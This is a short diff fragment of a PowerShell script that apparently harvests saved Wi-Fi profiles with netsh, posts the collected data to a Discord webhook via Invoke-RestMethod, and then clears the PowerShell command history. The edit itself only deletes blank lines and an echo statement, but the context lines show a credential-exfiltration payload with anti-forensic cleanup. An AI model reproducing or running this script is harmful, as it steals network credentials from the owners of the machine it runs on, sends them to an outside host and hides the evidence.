@@ -11,11 +11,8 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
 	}
 	
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
-
 	
 }
-
-echo "panis"
 
 # Clear the PowerShell command history
 Clear-History
